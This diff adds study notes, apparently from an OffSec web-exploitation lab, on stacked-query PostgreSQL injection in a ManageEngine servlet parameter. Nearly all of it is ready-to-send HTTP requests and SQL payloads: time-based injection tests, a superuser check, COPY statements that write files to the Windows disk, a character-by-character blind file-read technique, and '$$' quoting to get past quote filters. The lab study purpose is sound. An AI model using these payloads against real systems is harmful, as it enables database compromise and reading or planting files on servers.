@@ -1,0 +1,106 @@
+Stacked Queries: One of the great things about Postgres SQL-injection attacks is that they allow an attacker to perform stacked queries.
+This means that we can use a query terminator character in our payload like (;) and inject a completely new query into the original vulnerable query string.
+
+So, we have to use (;) and (--+) in every payload.
+
+------------------------------------------Testing & Confirming the Vulnerability from white-box------------------------------------------------------------------
+
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1; HTTP/1.1
+Host: manageengine:8443
+
+From the Postgres log file: :ERROR:  syntax error at or near "and" at character 2
+
+------------------------------------------Testing & Confirming the Vulnerability from black-box------------------------------------------------------------------
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10); HTTP/1.1
+Host: manageengine:8443
+
+Or
+
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10)--+ HTTP/1.1
+Host: manageengine:8443
+
+
+Result: it took several seconds for the response to come back depends on the second we put in the SQL query
+Confirmed SQL injection Vulnerability
+
+
+
+-------------------------------------------------Checking DBA Role-------------------------------------------------------------------
+
+Simple Query: select case when current_setting('is_superuser')='on' then pg_sleep(10) end;
+
+Bypass Query: SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;
+
+Exploitation:
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+ HTTP/1.1
+Host: manageengine:8443
+
+Result
+The injected query shown will only sleep for 10 seconds if the is_superuser setting from the current_setting table is set to "on."
+
+
+
+-------------------------------------------------Writing files on the system-------------------------------------------------------------------
+
+	1. Simple SQL query to write file on system: 
+	Connect to pgsql via Cmd: psql -p 15432 -U postgres amdb 
+	
+COPY (select 'awae') to 'C:\Users\Public\offsec.txt';
+
+	2. Bypass Query: COPY (select $$awae$$) to $$C:\Users\Public\offsec.txt$$;
+
+
+	3. SQL injection Exploitation:
+
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(select+$$awae$$)+to+$$C:\Users\Public\offsec1.txt$$;--+ HTTP/1.1
+Host: 192.168.170.113:8443
+
+Result:
+We exploited stacked-query sql injection by creating offsec1.txt from our sql injection.
+File has been created in the system.
+
+-------------------------------------------------Read files from the system-------------------------------------------------------------------
+1. Simple SQL queries, to create table and read system files using it:
+We have (offsec1.txt) file already created on the system and we want to read it via SQL queries:
+Steps:
+	• Connect to pgsql via Cmd: psql -p 15432 -U postgres amdb 
+
+	• Create the table manually: CREATE TEMP TABLE zaki_file (content TEXT);
+
+	• Copy files from the system to our table: COPY zaki_file FROM $$C:\\Users\\Public\\offsec1.txt$$;  --------------> bypass query with ($$)
+
+  •  Read the file now from our table we created: SELECT * FROM zaki_file;
+
+
+2. SQL injection Exploitation:
+Since we have stacked queries, it's also possible to read files directly from our payload.
+
+Example of target file we want to read it via sql injection payload (C:\awae.txt)
+	• Reading the first character of the fle C:\awae.txt and comparing it with the letter "a". If the letter is "a", sleep for 10 seconds.
+
+***Simple payload***
+create+temp+table+awae+(content+text);copy+awae+from+'c:\awae.txt';select+case+when(ascii(substr((select+content+from+awae),1,1))=97)+then+pg_sleep(10)+end;
+
+***Bypass Payload***
+create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=97)+then+pg_sleep(10)+end;
+
+***Exploitation payload***
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=97)+then+pg_sleep(10)+end;--+ HTTP/1.0
+Host: manageengine:8443
+
+► Result:
+we got 10 seconds of delay in response. This confirms the first letter of the file content is "a".
+By this method, we can extract and read files from the system
+
+Note:
+• We use substr to read the file byte by byte, and ascii to convert each byte into a number.
+• This helps us avoid encoding problems, which is very important when reading binary files.
+• Always we should use (--+) to close the query in exploitation.
+
+
+
+
+
+
+
+
